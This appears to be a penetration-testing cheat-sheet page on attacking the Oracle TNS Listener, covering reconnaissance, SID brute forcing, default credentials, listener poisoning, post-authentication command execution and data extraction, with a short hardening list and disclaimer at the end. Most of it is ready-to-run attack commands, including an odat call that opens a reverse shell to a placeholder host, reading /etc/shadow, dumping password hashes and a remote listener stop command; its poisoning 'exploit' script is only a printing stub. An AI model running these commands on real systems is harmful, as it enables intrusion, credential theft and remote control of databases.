---
title: "Oracle TNS Listener"
date: 2026-02-24
draft: false
---

## Overview

Oracle Database exposes a TNS (Transparent Network Substrate) Listener on port 1521 that acts as the gateway for all database connections. The listener process, when misconfigured or running a vulnerable version, can be exploited for information disclosure, poisoning attacks, SID brute forcing, and full database access through default credentials. Oracle databases are among the highest-value targets in enterprise pentests due to the sensitive business data they contain.

**Default Ports:**
| Port | Service |
|------|---------|
| 1521 | Oracle TNS Listener |
| 1526 | Oracle TNS (secondary) |
| 2483 | Oracle TNS over TCP (newer) |
| 2484 | Oracle TNS over TLS |
| 5500 | Oracle EM Express HTTP |
| 5501 | Oracle EM Express HTTPS |
| 1158 | Oracle Enterprise Manager (older) |

---

## Recon and Fingerprinting

### Nmap

```bash
nmap -sV -p 1521,1526,2483 TARGET_IP
nmap -p 1521 --script oracle-tns-version TARGET_IP
nmap -p 1521 --script oracle-sid-brute --script-args oracle-sid-brute.sidfile=sids.txt TARGET_IP
nmap -p 1521 --script oracle-brute --script-args oracle-brute.sid=ORCL TARGET_IP
```

### tnscmd10g — Direct TNS Commands

```bash
# Install
apt install tnscmd10g

# Get listener version
tnscmd10g version -h TARGET_IP

# Get listener status
tnscmd10g status -h TARGET_IP

# Ping listener
tnscmd10g ping -h TARGET_IP

# Enumerate services
tnscmd10g services -h TARGET_IP

# Try to get listener log file path
tnscmd10g version -h TARGET_IP | grep -i log

# Stop command (may work on unprotected listeners)
tnscmd10g stop -h TARGET_IP
```

> **Modern Oracle limitation:** In Oracle 19c, 21c, and 23c, the `status` and `services` commands are disabled by default unless issued from the local machine. The parameter `ADMIN_RESTRICTIONS_LISTENER = ON` (set in `listener.ora`) blocks all remote management commands. If `tnscmd10g status` returns empty output or an error, this restriction is likely active. Use Metasploit as an alternative:
>
> ```bash
> use auxiliary/scanner/oracle/tnslsnr_version
> set RHOSTS TARGET_IP
> run
> ```

### Manual TNS Version Request

```bash
# Direct TNS CONNECT packet for version info
python3 -c "
import socket

def send_tns(host, port, data):
    s = socket.socket()
    s.settimeout(5)
    s.connect((host, port))
    s.send(data)
    resp = s.recv(1024)
    s.close()
    return resp

# TNS version packet (simplified)
version_req = bytes([
    0x00, 0x57, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x01, 0x36, 0x01, 0x2c, 0x00, 0x00, 0x08, 0x00,
    0x7f, 0xff, 0x86, 0x0e, 0x00, 0x00, 0x01, 0x00,
    0x00, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00
])

resp = send_tns('TARGET_IP', 1521, version_req)
print('Response:', resp)
print('Hex:', resp.hex())
"
```

---

## SID Brute Force

The SID (System Identifier) is the unique name of an Oracle database instance. It is required for connection.

### Common SID Names

```
ORCL, ORACLE, ORA, DB, TEST, DEV, PROD, SALES, HR, FINANCE, DW, ERP, CRM, SAP, E1, XE, PDB1, CDB1
```

### Nmap SID Enumeration

```bash
# Built-in SID wordlist
nmap -p 1521 --script oracle-sid-brute TARGET_IP

# Custom SID list
cat > /tmp/oracle_sids.txt << 'EOF'
ORCL
ORACLE
XE
DB11G
PROD
DEV
TEST
DW
ERP
HR
FINANCE
APPS
EOF

nmap -p 1521 --script oracle-sid-brute \
  --script-args oracle-sid-brute.sidfile=/tmp/oracle_sids.txt \
  TARGET_IP
```

### oscanner — Oracle Security Scanner

```bash
# Install
apt install oscanner

# Run full scan
oscanner -s TARGET_IP -P 1521

# Outputs: version, SIDs, default accounts

# With verbose output
oscanner -s TARGET_IP -P 1521 -v 3

# Scan with custom SID list
oscanner -s TARGET_IP -P 1521 -f /tmp/sids.txt
```

### odat — Oracle Database Attacking Tool

```bash
# Install odat
git clone https://github.com/quentinhardy/odat.git
cd odat && pip3 install -r requirements.txt

# SID enumeration
python3 odat.py sidguesser -s TARGET_IP -p 1521

# Service name enumeration (odat sidguesser tests both SIDs and Service Names)
python3 odat.py sidguesser -s TARGET_IP -p 1521 --sids-file sids.txt

# List available modules
python3 odat.py --help
```

> **SID vs Service Name — critical for modern Oracle:** From Oracle 12c onward, the multitenant/PDB architecture uses Service Names rather than SIDs. Many pentesters brute force only SIDs and miss active databases entirely.
>
> - **SID** connection string: `sqlplus user/pass@TARGET_IP:1521:MYSID`
> - **Service Name** connection string: `sqlplus user/pass@TARGET_IP:1521/MYSERVICE` (note the `/` not `:`)
>
> `odat sidguesser` tests both formats. For Cloud Oracle and Oracle 19c+, Service Name brute forcing is often more productive than SID guessing. Common service names follow the pattern `PDBNAME.DOMAIN` (e.g., `PROD.example.com`).

---

## Default Credentials

Oracle ships with several default accounts that are frequently left enabled:

| Username | Password | Notes |
|----------|----------|-------|
| `sys` | `change_on_install` | SYSDBA role |
| `system` | `manager` | DBA role |
| `scott` | `tiger` | Demo account |
| `dbsnmp` | `dbsnmp` | SNMP management |
| `outln` | `outln` | Optimizer plan storage |
| `mdsys` | `mdsys` | Spatial data |
| `ctxsys` | `ctxsys` | Text indexing |
| `ordplugins` | `ordplugins` | Multimedia |
| `ordsys` | `ordsys` | Multimedia |
| `lbacsys` | `lbacsys` | Label Security |
| `hr` | `hr` | Human Resources sample |
| `XDB` | `XDB` | XML DB component |
| `APEX_PUBLIC_USER` | various | Oracle APEX (check version) |
| `ANONYMOUS` | (none) | Default public access |

> **Oracle APEX:** If Oracle APEX is installed, it exposes its own HTTP listener on port 8080 (HTTP) or 8443 (HTTPS) — a completely separate attack surface from the TNS listener. Enumerate with `curl -s http://TARGET_IP:8080/apex/` and `nmap -p 8080,8443 TARGET_IP`.

### Credential Testing with odat

```bash
# Test all known default credentials
python3 odat.py passwordguesser -s TARGET_IP -p 1521 -d ORCL --accounts-file accounts.txt

# Test with known SID
python3 odat.py passwordguesser -s TARGET_IP -p 1521 -d ORCL

# Test specific user/pass
python3 odat.py all -s TARGET_IP -p 1521 -d ORCL -U scott -P tiger
```

### sqlplus Connection

```bash
# Connect via sqlplus
sqlplus scott/tiger@TARGET_IP:1521/ORCL

# Connect as SYSDBA (highest privilege)
sqlplus sys/change_on_install@TARGET_IP:1521/ORCL as sysdba

# Using connection string
sqlplus 'system/manager@(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=TARGET_IP)(PORT=1521))(CONNECT_DATA=(SID=ORCL)))'
```

---

## CVE-2012-1675 — TNS Listener Poisoning

**CVSS:** 7.6 High (CVSS v2)
**Affected:** Oracle Database 10g R1/R2, 11g R1/R2 (before April 2012 CPU)
**Type:** Man-in-the-middle via TNS listener registration
**CWE:** CWE-290

### Vulnerability Details

Prior to the April 2012 Critical Patch Update, the Oracle TNS Listener accepted remote service registrations without authentication. An attacker on the same network could register a malicious service with the same name as a legitimate service, intercepting client connections. The attacker registers a fake service with a higher load, causing the listener to route new connections to the attacker's handler.

This is known as the "TNS Listener Poison Attack" and was demonstrated by Joxean Koret.

> **CVE-2012-1675 modern mitigation note:** Oracle introduced two parameters that, when configured, prevent this attack:
> - `SECURE_CONTROL_LISTENER`: blocks remote management commands to the listener
> - `COST` (Class of Secure Transports): enforces encrypted connections for listener registration
>
> If `lsnrctl set password` from a remote host is rejected, or `tnscmd10g` returns an error, these protections are likely active. Test with `lsnrctl set password ""` remotely — rejection confirms the mitigation is in place.

### Attack Procedure

```bash
# Step 1: Identify legitimate services
tnscmd10g services -h TARGET_IP

# Step 2: Register a malicious service with the same name
# Using tnscmd10g to register
python3 -c "
import socket

def tns_register(host, port, service_name):
    # Craft TNS CONNECT packet for service registration
    # This exploits the lack of auth in older TNS versions
    register_data = b'(SERVICE_NAME=%s)(INSTANCE_NAME=FAKE)' % service_name.encode()
    # Actual exploit requires a crafted CONNECT packet — see Joxean Koret PoC
    print(f'Attempting to register {service_name} as malicious service...')

tns_register('TARGET_IP', 1521, 'ORCL')
"

# Step 3: Use metasploit module
msfconsole -q
# use auxiliary/admin/oracle/tnscmd
# set RHOSTS TARGET_IP
# set CMD services
# run
```

---

## Remote OS Authentication Bypass

Oracle's `REMOTE_OS_AUTHENT` parameter (deprecated but sometimes enabled) allows users to authenticate using their OS username without a password.

```bash
# Check if enabled (requires DB access)
# SELECT value FROM v$parameter WHERE name = 'remote_os_authent';

# If REMOTE_OS_AUTHENT=TRUE, connect as ops$username
sqlplus /@TARGET_IP:1521/ORCL  # Uses current OS username with ops$ prefix

# Create a user with OS$ prefix first (if you have DB creds)
# CREATE USER "OPS$root" IDENTIFIED EXTERNALLY;
# GRANT DBA TO "OPS$root";
```

---

## Post-Authentication Exploitation

### Privilege Escalation to SYSDBA

```bash
# Connect with DBA account and escalate
sqlplus system/manager@TARGET_IP:1521/ORCL

# Check current privileges
SQL> SELECT * FROM session_privs;

# Check if EXECUTE ANY PROCEDURE is granted
SQL> SELECT * FROM user_sys_privs WHERE privilege = 'EXECUTE ANY PROCEDURE';

# DBMS_JOB OS command execution (as SYSDBA)
SQL> EXEC DBMS_SCHEDULER.CREATE_JOB(job_name=>'RCE_TEST', job_type=>'EXECUTABLE', job_action=>'/bin/bash -c "id > /tmp/oracle_rce.txt"', enabled=>TRUE, auto_drop=>TRUE);
```

### odat — Full Exploitation

```bash
# Check all capabilities with obtained credentials
python3 odat.py all -s TARGET_IP -p 1521 -d ORCL -U system -P manager

# File read (UTL_FILE)
python3 odat.py utlfile -s TARGET_IP -p 1521 -d ORCL -U system -P manager \
  --getFile /etc/passwd /tmp/oracle_passwd

# File write
python3 odat.py utlfile -s TARGET_IP -p 1521 -d ORCL -U system -P manager \
  --putFile /tmp/test.txt "$(cat /etc/passwd)"

# OS command execution (DBMS_SCHEDULER)
python3 odat.py dbmsscheduler -s TARGET_IP -p 1521 -d ORCL -U system -P manager \
  --exec "id > /tmp/oracle_id.txt"

# Java stored procedure RCE
python3 odat.py java -s TARGET_IP -p 1521 -d ORCL -U system -P manager \
  --exec "id"

# External tables (file read from DB perspective)
python3 odat.py externaltable -s TARGET_IP -p 1521 -d ORCL -U system -P manager \
  --getFile /etc/shadow /tmp/shadow

# Get a reverse shell
python3 odat.py dbmsscheduler -s TARGET_IP -p 1521 -d ORCL -U system -P manager \
  --exec "bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
```

---

## Sensitive Data Extraction

```sql
-- Connect and extract sensitive data

-- List all tables
SELECT owner, table_name FROM all_tables ORDER BY owner, table_name;

-- Check for password-related tables
SELECT owner, table_name, column_name
FROM all_tab_columns
WHERE lower(column_name) LIKE '%pass%'
   OR lower(column_name) LIKE '%pwd%'
   OR lower(column_name) LIKE '%password%';

-- Dump DBA users
SELECT username, password, account_status FROM dba_users;

-- Get user hashes (Oracle 11g format)
SELECT name, password, spare4 FROM sys.user$ WHERE type# = 1;

-- List all database links (credentials to other DBs)
SELECT db_link, username, host FROM dba_db_links;

-- List scheduler jobs (may contain credentials in action)
SELECT job_name, job_type, job_action FROM dba_scheduler_jobs;

-- Check for UTL_HTTP/UTL_FILE privileges (SSRF/file access)
SELECT grantee, privilege FROM dba_sys_privs
WHERE grantee IN (SELECT username FROM dba_users)
AND privilege IN ('EXECUTE ANY PROCEDURE', 'CREATE ANY DIRECTORY');
```

---

## Full Attack Chain

```
1. Discovery
   nmap -p 1521 --script oracle-tns-version TARGET_IP

2. SID Enumeration
   oscanner -s TARGET_IP -P 1521
   nmap -p 1521 --script oracle-sid-brute TARGET_IP

3. Default Credential Testing
   odat.py passwordguesser -s TARGET_IP -p 1521 -d ORCL

4. Authentication
   sqlplus scott/tiger@TARGET_IP:1521/ORCL
   sqlplus system/manager@TARGET_IP:1521/ORCL

5. Privilege Assessment
   odat.py all -s TARGET_IP -p 1521 -d ORCL -U system -P manager

6. OS Command Execution
   odat.py dbmsscheduler (or java module)
   → reverse shell via DBMS_SCHEDULER

7. Data Extraction
   SELECT ... FROM dba_users
   SELECT ... FROM all_tab_columns WHERE password
   SELECT ... FROM dba_db_links
```

---

## Metasploit Modules

```bash
msfconsole -q

# SID enumeration
use auxiliary/scanner/oracle/sid_brute
set RHOSTS TARGET_IP
run

# Login brute force
use auxiliary/scanner/oracle/oracle_login
set RHOSTS TARGET_IP
set SID ORCL
run

# TNS version
use auxiliary/scanner/oracle/tnscmd
set RHOSTS TARGET_IP
set CMD version
run

# SQL execution via DBA creds
use auxiliary/admin/oracle/sql
set RHOSTS TARGET_IP
set RPORT 1521
set SID ORCL
set USERNAME system
set PASSWORD manager
set SQL "SELECT username FROM dba_users"
run
```

---

## Hardening Recommendations

- Set a listener password: `PASSWORDS_LISTENER` in `listener.ora`
- Disable dynamic service registration: `DYNAMIC_REGISTRATION=OFF`
- Enable `VALID_NODE_CHECKING` to restrict connecting IPs
- Change all default passwords (`sys`, `system`, `scott`, etc.) immediately
- Lock unused accounts: `ALTER USER scott ACCOUNT LOCK;`
- Remove sample schemas (`hr`, `oe`, `sh`, `pm`) from production
- Set `REMOTE_OS_AUTHENT=FALSE` (should be default in 11g+)
- Enable Oracle Unified Auditing for all connections
- Restrict port 1521 to application servers only via firewall
- Enable Oracle Database Vault for additional separation of duties
- Apply quarterly Critical Patch Updates


---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.